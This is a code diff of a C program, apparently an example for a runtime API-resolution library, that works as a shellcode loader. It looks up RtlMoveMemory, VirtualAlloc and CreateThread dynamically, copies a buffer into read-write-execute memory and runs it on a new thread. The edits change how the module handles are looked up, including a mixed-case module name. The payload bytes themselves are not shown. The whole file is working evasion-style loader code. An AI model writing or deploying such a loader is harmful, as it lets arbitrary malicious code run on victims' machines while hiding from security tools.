@@ -60,27 +60,38 @@ typedef DWORD(WINAPI *WaitForSingleObject_t)(
     HANDLE hHandle,
     DWORD dwMilliseconds);
 
+typedef enum AppPolicyWindowingModel {
+  AppPolicyWindowingModel_None,
+  AppPolicyWindowingModel_Universal,
+  AppPolicyWindowingModel_ClassicDesktop,
+  AppPolicyWindowingModel_ClassicPhone
+} AppPolicyWindowingModel ;
+
+typedef LONG(WINAPI *AppPolicyGetWindowingModel_t)(
+    HANDLE processToken,
+    AppPolicyWindowingModel *policy);
+
 int main(void)
 {
-    RtlMoveMemory_t RtlMoveMemory = (RtlMoveMemory_t)(ULONG_PTR)RfGetProcAddressA(
-        RfGetModuleHandleW(L"ntdll.dll", FALSE),
+    RtlMoveMemory_t MyRtlMoveMemory = (RtlMoveMemory_t)(ULONG_PTR)RfGetProcAddressA(
+        RfGetModuleHandleW(L"ntdll.dll"),
         "RtlMoveMemory");
     VirtualAlloc_t VirtualAlloc = (VirtualAlloc_t)(ULONG_PTR)RfGetProcAddressA(
-        RfGetModuleHandleW(L"KERNEL32.DLL", FALSE),
+        RfGetModuleHandleW(L"kernEl32.DLL"),
         "VirtualAlloc");
     CreateThread_t CreateThread = (CreateThread_t)(ULONG_PTR)RfGetProcAddressA(
-        RfGetModuleHandleW(L"KERNEL32.DLL", FALSE),
+        RfGetModuleHandleW(L"KERNEL32.DLL"),
         "CreateThread");
     WaitForSingleObject_t WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)RfGetProcAddressA(
-        RfGetModuleHandleW(L"KERNEL32.DLL", FALSE),
+        RfGetModuleHandleW(L"KERNEL32.DLL"),
         "WaitForSingleObject");
 
     void *buf_routine = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    RtlMoveMemory(buf_routine, buf, sizeof(buf));
+    MyRtlMoveMemory(buf_routine, buf, sizeof(buf));
 
     HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)buf_routine, 0, 0, 0);
     WaitForSingleObject(th, INFINITE);
 
     return 0;
-} 
+}
